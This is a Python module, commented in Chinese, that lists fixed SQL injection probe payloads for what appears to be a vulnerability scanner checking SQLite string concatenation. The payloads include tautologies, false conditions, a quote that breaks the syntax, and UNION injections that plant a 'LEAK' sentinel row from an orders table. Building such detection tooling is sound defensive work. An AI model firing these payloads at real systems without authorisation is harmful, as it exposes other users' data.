"""固定探测载荷目录。

设计原则：
- 载荷集合与顺序是模块级常量，任何运行之间完全一致，保证报告可复现；
- 载荷针对 SQLite 字符串拼接场景构造，全部为确定性字符串，不含随机内容；
- P 系列为初筛探测载荷，C 系列为二次确认载荷。
"""

from dataclasses import dataclass


@dataclass(frozen=True)
class Payload:
    payload_id: str
    kind: str          # tautology / false_condition / union / syntax_error / confirm_*
    title: str
    value: str


# 初筛载荷（顺序固定，扫描时严格按此顺序发送）
# 设计说明：全部载荷不依赖 SQL 行注释（--），采用字符串引号自平衡写法，
# 因此对“参数后仍有 AND 子句/绑定参数”的查询结构同样适用；
# 在参数化查询中这些字符串只作为普通值，不会产生任何语义变化。
PROBES: tuple[Payload, ...] = (
    Payload(
        "P01_TAUTOLOGY",
        "tautology",
        "永真条件拼接，观察是否越权返回其他订单",
        "' OR '1'='1",
    ),
    Payload(
        "P02_FALSE_CONDITION",
        "false_condition",
        "永假条件拼接，观察查询逻辑是否被输入改变（仅作信息记录，不单独判疑）",
        "' AND '1'='2",
    ),
    Payload(
        "P03_UNION",
        "union",
        "UNION 拼接，观察是否能向结果集注入额外行",
        "' AND 1=2 UNION SELECT 'LEAK','x','x','x',0,'x','x' FROM orders WHERE '1'='1",
    ),
    Payload(
        "P04_SYNTAX_BREAK",
        "syntax_error",
        "单引号破坏语法，观察错误行为（仅作信息记录，不单独判疑）",
        "'",
    ),
)

# 二次确认载荷（顺序固定）
CONFIRMATIONS: tuple[Payload, ...] = (
    Payload(
        "C01_BOOL_TRUE",
        "confirm_boolean_true",
        "布尔差异（真）：预期注入点返回行数显著增多",
        "' OR 1=1 OR '1'='1",
    ),
    Payload(
        "C02_BOOL_FALSE",
        "confirm_boolean_false",
        "布尔差异（假）：预期注入点返回零行",
        "' AND 1=2 OR '1'='2",
    ),
    Payload(
        "C03_UNION_SENTINEL",
        "confirm_union_sentinel",
        "UNION 哨兵行：预期结果集中出现标记订单号 LEAK",
        "' AND 1=2 UNION SELECT 'LEAK','x','x','x',0,'x','x' FROM orders WHERE '1'='1",
    ),
)

# 哨兵值，与 C03 载荷保持一致
UNION_SENTINEL_ID = "LEAK"
